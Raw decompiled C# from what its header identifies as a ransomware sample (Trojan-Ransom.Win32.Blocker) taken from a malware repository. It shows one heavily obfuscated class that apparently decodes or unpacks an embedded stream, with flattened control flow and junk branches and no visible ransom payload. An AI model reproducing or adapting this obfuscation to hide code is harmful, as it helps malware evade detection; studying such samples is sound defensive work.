// Decompiled with JetBrains decompiler
// Type: .
// Assembly: Server.packed, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 712FD340-1A8D-4ADA-8620-0D072E5BB482
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00080-msil\Trojan-Ransom.Win32.Blocker.bipa-183abe361833d2ddb4e38325acbbb19715b5270dec52a0eb9bb6b99cfb8f1470.exe

using \u0003;
using \u0004;
using System;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;

namespace \u0003
{
  internal sealed class \u0003
  {
    public uint \u0001;
    public uint \u0002;
    public Stream \u0001;

    public void \u0001([In] Stream obj0)
    {
      int num1 = 2;
label_14:
      while (true)
      {
        int num2;
        int num3;
        int num4;
        switch (num1)
        {
          case 0:
          case 6:
            num1 = 4;
            continue;
          case 1:
            goto label_2;
          case 3:
          case 5:
            num3 = num2;
            int num5;
            while (true)
            {
              num4 = 5;
              if (num4 != 0 && num4 != 0)
              {
                if (num3 >= num4)
                {
                  if (true)
                    num5 = 1;
                  else
                    goto label_14;
                }
                else
                  goto label_13;
label_11:
                if (false)
                {
                  num3 = num5;
                  continue;
                }
                break;
label_13:
                num5 = 7;
                goto label_11;
              }
              else
                goto label_5;
            }
            num1 = num5;
            continue;
          case 4:
            int num6 = num2;
            num4 = 1;
            num3 = num6;
            break;
          case 7:
            this.\u0002 = this.\u0002 << 8 | (uint) (byte) \u0003.\u0003.\u0001(this.\u0001, 889, 840);
            goto case 0;
          default:
            this.\u0001 = obj0;
            if (true)
            {
              this.\u0002 = 0U;
              this.\u0001 = uint.MaxValue;
              num2 = 0;
              num1 = 5;
              continue;
            }
            goto label_1;
        }
label_5:
        num2 = num3 + num4;
        num1 = 5;
      }
label_2:
      return;
label_1:;
    }

    public void \u0001() => this.\u0001 = (Stream) null;

    public unsafe uint \u0001([In] int obj0)
    {
      int num1 = 20;
      void* voidPtr;
      if (num1 != 0)
      {
        // ISSUE: untyped stack allocation
        IntPtr num2 = __untypedstackalloc(num1);
        if (true)
        {
          voidPtr = (void*) num2;
          goto label_28;
        }
        else
          goto label_28;
      }
      else
        goto label_18;
label_5:
      int num3 = 6;
      goto label_26;
label_18:
      if (false)
        return (uint) num1;
      int num4;
      if (num1 <= 0)
        num4 = 10;
      else
        goto label_22;
label_21:
      num3 = num4;
      goto label_26;
label_22:
      num4 = 4;
      goto label_21;
label_26:
      while (true)
      {
        int num5;
        do
        {
          int num6 = num3;
          while (true)
          {
            switch (num6)
            {
              case 0:
              case 10:
                goto label_23;
              case 1:
                goto label_14;
              case 2:
                goto label_13;
              case 3:
                goto label_5;
              case 4:
                goto label_6;
              case 5:
                goto label_28;
              case 6:
              case 11:
                goto label_17;
              case 7:
                goto label_10;
              case 9:
                goto label_16;
              case 12:
                goto label_8;
              default:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle = __methodref (\u0003.\u0003.\u0001);
                num5 = 5;
                if (num5 == 0)
                {
                  num6 = num5;
                  continue;
                }
                goto label_27;
            }
          }
label_10:;
        }
        while (false);
        goto label_11;
label_6:
        *(int*) voidPtr = (int) (*(uint*) voidPtr >> 1);
        *(int*) ((IntPtr) voidPtr + 16) = (int) (*(uint*) ((IntPtr) voidPtr + 4) - *(uint*) voidPtr >> 31);
        int num7 = 12;
label_7:
        num3 = num7;
        continue;
label_8:
        if (true)
        {
          *(int*) ((IntPtr) voidPtr + 4) = (int) *(uint*) ((IntPtr) voidPtr + 4) - ((int) *(uint*) voidPtr & (int) *(uint*) ((IntPtr) voidPtr + 16) - 1);
          *(int*) ((IntPtr) voidPtr + 8) = (int) *(uint*) ((IntPtr) voidPtr + 8) << 1 | 1 - (int) *(uint*) ((IntPtr) voidPtr + 16);
          num3 = 7;
          continue;
        }
        goto label_22;
label_11:
        int num8 = *(uint*) voidPtr >= 16777216U ? 9 : 2;
        if (false)
        {
          num7 = num8;
          goto label_7;
        }
        else
        {
          num3 = num8;
          continue;
        }
label_13:
        *(int*) ((IntPtr) voidPtr + 4) = (int) *(uint*) ((IntPtr) voidPtr + 4) << 8 | (int) (byte) \u0003.\u0003.\u0001(this.\u0001, 267, 314);
        num3 = 1;
        continue;
label_14:
        *(int*) voidPtr = (int) *(uint*) voidPtr << 8;
label_15:
        num3 = 9;
        continue;
label_16:
        *(int*) ((IntPtr) voidPtr + 12) = *(int*) ((IntPtr) voidPtr + 12) - 1;
        num3 = 6;
        continue;
label_23:
        this.\u0001 = *(uint*) voidPtr;
        this.\u0002 = *(uint*) ((IntPtr) voidPtr + 4);
        if (false)
          goto label_15;
        else
          goto label_24;
label_27:
        num3 = num5;
      }
label_17:
      num1 = *(int*) ((IntPtr) voidPtr + 12);
      goto label_18;
label_24:
      return *(uint*) ((IntPtr) voidPtr + 8);
label_28:
      *(int*) voidPtr = (int) this.\u0001;
      *(int*) ((IntPtr) voidPtr + 4) = (int) this.\u0002;
      *(int*) ((IntPtr) voidPtr + 8) = 0;
      *(int*) ((IntPtr) voidPtr + 12) = obj0;
      goto label_5;
    }

    static \u0003() => \u0001.\u0001();

    internal static int \u0001([In] Stream obj0, [In] int obj1, [In] int obj2)
    {
      if (false)
        goto label_6;
      else
        goto label_12;
label_1:
      int num1;
      int num2;
      if (true)
        num2 = num1;
      else
        goto label_8;
label_2:
      switch (num2)
      {
        case 0:
        case 2:
          num1 = 3;
          goto label_1;
        case 3:
          goto label_12;
        case 4:
          goto label_10;
        case 5:
          return obj0.ReadByte();
        default:
          // ISSUE: method reference
          RuntimeMethodHandle runtimeMethodHandle = __methodref (\u0003.\u0003.\u0001);
          num1 = 3;
          goto label_1;
      }
label_6:
      int num3 = 2;
      goto label_14;
label_8:
      num3 = 5;
      goto label_14;
label_10:
      num1 = 3;
      goto label_1;
label_12:
      int num4 = obj2;
      if (false)
      {
        num2 = num4;
        goto label_2;
      }
      else
      {
        if (true)
          goto label_13;
label_5:
        switch (num4)
        {
          case 0:
            goto label_8;
          default:
            goto label_6;
        }
label_13:
        int num5 = obj1;
        num4 = (num4 ^ num5) - 49;
        goto label_5;
      }
label_14:
      num1 = num3;
      if (false)
        goto label_10;
      else
        goto label_1;
    }

    internal static int \u0001([In] Type obj0, [In] int obj1, [In] int obj2)
    {
      if (false)
        goto label_6;
      else
        goto label_12;
label_1:
      int num1;
      int num2;
      if (true)
        num2 = num1;
      else
        goto label_7;
label_2:
      switch (num2)
      {
        case 0:
        case 5:
          return Marshal.SizeOf(obj0);
        case 1:
        case 4:
        case 7:
          num1 = 2;
          goto label_1;
        case 2:
          goto label_12;
        case 6:
          goto label_10;
        default:
          // ISSUE: method reference
          RuntimeMethodHandle runtimeMethodHandle = __methodref (\u0003.\u0003.\u0001);
          num1 = 2;
          goto label_1;
      }
label_6:
      int num3 = 4;
      goto label_14;
label_7:
      num3 = 5;
      goto label_14;
label_10:
      num1 = 2;
      goto label_1;
label_12:
      int num4 = obj2;
      if (false)
      {
        num2 = num4;
        goto label_2;
      }
      else
      {
        if (true)
          goto label_13;
label_5:
        switch (num4)
        {
          case 0:
            goto label_7;
          default:
            goto label_6;
        }
label_13:
        int num5 = obj1;
        num4 = (num4 ^ num5) - 20;
        goto label_5;
      }
label_14:
      num1 = num3;
      if (false)
        goto label_10;
      else
        goto label_1;
    }

    internal static long \u0001([In] Stream obj0, [In] long obj1, [In] SeekOrigin obj2, [In] int obj3, [In] int obj4)
    {
label_13:
      int num1 = obj4;
      while (true)
      {
        int num2 = obj3;
        int num3 = num1 ^ num2;
        int num4;
        if (true)
        {
          if (true)
          {
            switch (num3 - 123)
            {
              case 0:
                num3 = 3;
                goto label_15;
              default:
                num3 = 4;
                goto label_15;
            }
          }
          else
          {
            num4 = num3;
            goto label_10;
          }
        }
        else
          goto label_15;
label_7:
        int num5 = 7;
        if (num5 == 0)
        {
          num1 = num5;
          continue;
        }
        int num6 = num5;
        goto label_12;
label_10:
        num6 = num4;
        if (false)
          goto label_7;
label_12:
        while (true)
        {
          do
          {
            switch (num6)
            {
              case 0:
              case 1:
              case 2:
                goto label_9;
              case 3:
                continue;
              case 4:
                goto label_7;
              case 5:
              case 7:
                goto label_13;
              default:
                goto label_2;
            }
          }
          while (false);
          goto label_17;
label_2:
          // ISSUE: method reference
          RuntimeMethodHandle runtimeMethodHandle = __methodref (\u0003.\u0003.\u0001);
          num6 = 7;
        }
label_9:
        num4 = 7;
        goto label_10;
label_15:
        num6 = num3;
        goto label_12;
      }
label_17:
      return obj0.Seek(obj1, obj2);
    }

    internal static object \u0001([In] IntPtr obj0, [In] Type obj1, [In] int obj2, [In] int obj3)
    {
label_11:
      int num1 = obj3;
      if (true)
        goto label_12;
label_1:
      int num2;
      switch (num1)
      {
        case 0:
        case 1:
        case 5:
          if (true)
          {
            num2 = 4;
            if (true)
            {
              if (false)
                goto label_4;
              else
                goto label_10;
            }
            else
              goto label_5;
          }
          else
            goto case 2;
        case 2:
        case 6:
          return Marshal.PtrToStructure(obj0, obj1);
        case 3:
          num2 = 4;
          goto label_10;
        case 4:
          goto label_11;
        default:
          // ISSUE: method reference
          RuntimeMethodHandle runtimeMethodHandle = __methodref (\u0003.\u0003.\u0001);
          break;
      }
label_3:
      num2 = 4;
      goto label_10;
label_4:
      int num3 = 3;
      goto label_13;
label_5:
      num3 = 6;
      goto label_13;
label_10:
      num1 = num2;
      goto label_1;
label_12:
      int num4 = obj2;
      switch (num1 ^ num4)
      {
        case 13:
          goto label_5;
        default:
          goto label_4;
      }
label_13:
      num2 = num3;
      if (false)
        goto label_3;
      else
        goto label_10;
    }

    internal static string \u0001([In] AssemblyName obj0, [In] int obj1, [In] int obj2)
    {
      if (false)
        goto label_6;
      else
        goto label_12;
label_1:
      int num1;
      int num2;
      if (true)
        num2 = num1;
      else
        goto label_7;
label_2:
      switch (num2)
      {
        case 0:
        case 4:
        case 7:
          goto label_12;
        case 1:
        case 5:
          return obj0.Name;
        case 3:
          goto label_10;
        case 6:
          num1 = 0;
          goto label_1;
        default:
          // ISSUE: method reference
          RuntimeMethodHandle runtimeMethodHandle = __methodref (\u0003.\u0003.\u0001);
          num1 = 0;
          goto label_1;
      }
label_6:
      int num3 = 6;
      goto label_14;
label_7:
      num3 = 1;
      goto label_14;
label_10:
      num1 = 0;
      goto label_1;
label_12:
      int num4 = obj2;
      if (false)
      {
        num2 = num4;
        goto label_2;
      }
      else
      {
        if (true)
          goto label_13;
label_5:
        switch (num4)
        {
          case 0:
            goto label_7;
          default:
            goto label_6;
        }
label_13:
        int num5 = obj1;
        num4 = (num4 ^ num5) - 67;
        goto label_5;
      }
label_14:
      num1 = num3;
      if (false)
        goto label_10;
      else
        goto label_1;
    }

    internal static object \u0001([In] AppDomain obj0, [In] string obj1, [In] int obj2, [In] int obj3)
    {
      do
      {
        do
          ;
        while (false);
        switch (obj3 ^ obj2)
        {
          case 58:
            continue;
          default:
            if (false)
              goto label_4;
            else
              continue;
        }
      }
      while (false);
label_4:
      return obj0.GetData(obj1);
    }

    [StructLayout(LayoutKind.Auto)]
    internal struct \u0001
    {
      internal \u000E \u0001;
      internal \u0003.\u0003 \u0001;
      internal Ⴈ.Ⴐ[] \u0001;
      internal Ⴈ.Ⴐ[] \u0002;
      internal Ⴈ.Ⴐ[] \u0003;
      internal Ⴈ.Ⴐ[] \u0004;
      internal Ⴈ.Ⴐ[] \u0005;
      internal Ⴈ.Ⴐ[] \u0006;
      internal \u0002[] \u0001;
      internal Ⴈ.Ⴐ[] \u0007;
      internal \u0002 \u0001;
      internal uint \u0001;
      internal uint \u0002;
      internal uint \u0003;
    }
  }
}
